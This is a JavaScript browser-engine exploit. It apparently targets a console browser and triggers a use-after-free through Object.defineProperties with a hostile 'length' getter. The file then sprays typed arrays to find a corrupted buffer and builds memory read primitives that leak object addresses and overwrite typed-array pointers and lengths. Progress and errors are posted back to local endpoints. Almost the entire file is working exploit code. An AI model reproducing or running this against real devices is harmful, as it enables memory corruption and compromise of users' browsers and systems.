function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		if(onSwitch !== undefined)
			send('log', msg);
		else
			print('Log: ' + JSON.stringify(msg));
	}
};
var log = console.log;
if(onSwitch !== undefined) {
	window.onerror = function(msg, url, line) {
		send('error', [line, msg]);
		location.reload();
	};
}

log('Loaded');

var rwbuf = new ArrayBuffer(0x1001 * 4);
var tu = new Uint32Array(rwbuf);
for(var i = 0; i < tu.length; ++i)
	tu[i] = ((i & 1) == 0) ? 0x41424344 : 0x41414141;

function pressureGC() {
	var pressure = new Array(4000);
	log('Pressurizing');
	for (var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x1000);
	}
	for (var i = 0; i < pressure.length; ++i)
		pressure[i] = 0;
}

var bufs;
function allocBuffers() {
	bufs = new Array(1500000);
	log('Making ' + bufs.length + ' buffers');
	for(var i = 0; i < bufs.length; ++i) {
		bufs[i] = new Uint32Array(rwbuf);
	}
}

function doItAll() {
	log('Starting');

	bufs = undefined;

	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(bufs === undefined) {
			//pressureGC();
			allocBuffers();
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	var stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	stale = target.stale;

	log('Checking if triggered...');
	if(stale.length == before_len) {
		log('Failed to overwrite array');
		location.reload();
		return;
	}

	log('Triggered.  New length: 0x' + stale.length.toString(16));

	/*if(stale.length != 0x1001) {
		log('Bailing.');
		location.reload();
		return;
	}*/

	var temp = new Uint32Array(0x10);
	temp[0] = 0x41414141;
	stale[1] = temp;

	log('Looking for buf...');

	function dumpbuf(count) {
		for(var j = 0; j < count; ++j)
			log('Buf[' + j + '] == 0x' + bufs[i][j].toString(16));
	}

	for(var i = 0; i < bufs.length; ++i) {
		if(bufs[i][0] != 0x41424344) {
			function setStale(obj) {
				stale[1] = obj;
			}

			function setPtr(lo, hi, len) {
				setStale(temp);
				bufs[i][4] = lo;
				bufs[i][5] = hi;
				bufs[i][6] = len;
			}

			function read4(lo, hi) {
				setPtr(lo, hi, 1);
				return temp[0];
			}

			function readAddr(obj) {
				setStale(obj);
				log('Obj memory:');
				dumpbuf(16);
				var addr = [bufs[i][4], bufs[i][5]];
				setStale(temp);
				log('Prev 0x' + addr[0].toString(16));
				log('Now 0x' + bufs[i][4].toString(16));

				return addr;
			}

			log('temp memory:');
			dumpbuf(16);
			var addr = readAddr(tu);
			//log(read4(addr[0], addr[1]).toString(16));
			bufs[i][6] = 27;
			log('temp memory:');
			dumpbuf(16);
			log(temp.length);
			log(tu.length);
			break;
		}
	}

	log('Done');
}

